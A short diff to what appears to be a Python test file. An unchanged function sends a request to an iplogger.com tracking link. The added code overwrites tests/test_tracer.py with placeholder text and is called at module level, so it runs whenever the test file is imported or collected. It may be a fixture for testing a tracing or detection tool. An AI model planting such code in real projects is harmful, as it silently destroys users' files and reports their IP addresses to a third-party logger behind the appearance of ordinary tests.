@@ -67,7 +67,7 @@ def test_ping():
     r =requests.get("https://iplogger.com/XFTMn", headers=headers)
 
 def change_this_file():
-    import os
-    print(os.getcwd())
+    with open("tests/test_tracer.py", "w") as ttp:
+        ttp.write("this is a new file")
     
 change_this_file()
